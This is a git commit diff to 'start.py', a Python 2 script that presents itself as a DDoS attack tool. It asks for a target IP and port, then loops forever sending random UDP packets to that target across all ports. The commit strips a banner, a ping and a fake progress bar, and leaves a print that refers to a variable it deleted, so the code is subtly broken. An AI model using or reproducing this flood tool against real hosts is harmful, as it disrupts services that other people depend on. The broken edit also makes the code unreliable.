12986273347afd58c729a90a12e07cdea773aae6
LTGVE <117088567+LTGVE@users.noreply.github.com>
2022-11-28 20:58:04 +0800

    Update start.py

--- start.py
+++ start.py
@@ -18,7 +18,6 @@ bytes = random._urandom(1464)
 #############
 
 os.system("clear")
-os.system("figlet DDos Attack")
 print " ____  _____                     _   _   _             _ "
 print "|  _ \|  _  \  ___  ___         / \ | |_| |_ __ _  ___| | __ "
 print "| | | | | |  |/ _ \/ __|       / _ \| __| __/ _` |/ __| |/ /"
@@ -32,28 +31,16 @@ ip = raw_input("IP : ")
 port = input("port : ")
 
 os.system("clear")
-os.system("ping www.a1475.com")
-print "[                    ] 0% "
-time.sleep(3)
-print "[=====               ] 25%"
-time.sleep(3)
-print "[==========          ] 50%"
-time.sleep(3)
-print "[===============     ] 75%"
-time.sleep(3)
-print "[====================] 100%"
-time.sleep(3)
+os.system("")
+print"The DDoS is Starting!"
+time.sleep(5)
 sent = 0
-frequency = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
      if port == 65535:
        port = 1
-       if port == 65535:
-           frequency = frequency + 1
 
        print" Send %s to %s  of Through port 1-65535 frequency %s"%(sent,ip,frequency)
 
-#fixed a bug to if port == 65535
